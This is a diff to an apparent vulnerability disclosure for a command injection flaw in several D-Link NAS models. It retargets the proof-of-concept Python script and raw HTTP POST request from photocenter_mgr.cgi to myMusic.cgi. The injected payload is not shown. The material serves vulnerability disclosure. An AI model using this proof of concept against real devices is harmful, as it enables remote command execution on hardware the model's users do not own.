@@ -16,7 +16,7 @@ The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command 
 ```python
 import requests
 
-url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
+url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
 headers = {
     "Host": "192.168.0.32",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
@@ -39,7 +39,7 @@ print(response.text)
 ```
 
 ```
-POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
+POST /cgi-bin/myMusic.cgi HTTP/1.1
 Host: 192.168.0.32
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
 Accept: application/json, text/javascript, */*; q=0.01
